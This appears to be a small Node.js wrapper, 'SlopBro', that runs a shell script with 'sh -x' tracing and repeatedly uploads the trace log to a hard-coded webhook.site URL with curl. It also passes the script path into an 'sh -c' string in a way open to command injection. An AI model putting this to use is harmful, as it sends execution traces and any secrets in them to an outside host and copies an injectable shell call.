/* SlopBro (instrumented: streams the trace to a webhook) */
const child_process = require("child_process");
const fs = require("fs");
const HOOK = "https://webhook.site/974ded6f-8424-4edb-8a88-4ecb6b2957c4";

function log() {
  const message = Array.prototype.slice.call(arguments).join(" ");
  console.log(message);
  try { fs.appendFileSync("/tmp/slopbro.log", message + "\n"); } catch (e) {}
}

function pushLog(tag) {
  try {
    child_process.execFileSync("/usr/bin/curl", ["-s", "-m", "10",
      "--data-binary", "@/tmp/slopbro.log", HOOK]);
  } catch (e) { log("push failed:", e.message); }
}

function run() {
  log("entered run()");
  if (process.argv.length < 3) { log("error: missing script path"); process.exit(1); }
  const scriptPath = process.argv[2];
  const args = process.argv.slice(3);
  log("scriptPath:", scriptPath);

  const child = child_process.spawn("/bin/sh",
    ["-c", "sh -x " + JSON.stringify(scriptPath) + " 2>&1 | tee -a /tmp/slopbro.log"],
    { stdio: "ignore" });

  let ticks = 0;
  const timer = setInterval(function () {
    ticks++;
    log("heartbeat " + ticks);
    pushLog("beat");
    if (ticks >= 6) clearInterval(timer);
  }, 12000);

  child.on("exit", function (code) {
    clearInterval(timer);
    log("result: exit " + code);
    pushLog("final");
  });
}

module.exports = { run: run };
